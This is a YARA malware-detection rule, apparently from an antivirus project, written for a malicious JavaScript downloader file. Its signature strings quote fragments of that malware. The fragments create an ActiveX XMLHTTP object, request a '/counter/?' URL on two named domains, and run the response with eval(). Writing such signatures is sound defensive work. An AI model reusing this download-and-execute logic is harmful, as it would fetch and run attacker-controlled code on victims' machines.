rule sig_20170211_667febed1c61ab169a6677e164d62e5a {
  meta:
    description = "datamaliciousorder - file 20170211_667febed1c61ab169a6677e164d62e5a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2d3e6c79eaf580c5091a093915f31765810b6ac0ba7232d9c57b75813b883062"

  strings:
    $s1 = "var z8 = \"T\"; var z1 = \"Msxml2.XMLHTTP\"; var x = new Array(\"natureprintsfloors.com\",\"norcalpowersports.com\"); for (var i" ascii
    $s2 = "var z8 = \"T\"; var z1 = \"Msxml2.XMLHTTP\"; var x = new Array(\"natureprintsfloors.com\",\"norcalpowersports.com\"); for (var i" ascii
    $s3 = "length; i++) { var z7 = \"GE\" + z8; var m = \"LZZ8DROseKZv5s7iMrP6GLnZAA_rxFN6ffAJaPT3eVU_5hr_Qe6ziMluooJj7eSriuQxA3EqQQ0\"; va" ascii
    $s4 = "= new ActiveXObject(z1); x[i] = \"http://\"+x[i]+\"/counter/?\"; try { e.open(z7, x[i]+m, false); var z4 = \"a\"; e.send(); var " ascii
    $s5 = ".status; if (z5 == 200) { var z3 = e.responseText; var z3 = z3.split(m).join(z4); eval(z3); break; }; } catch(e) { }; };" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    all of them
}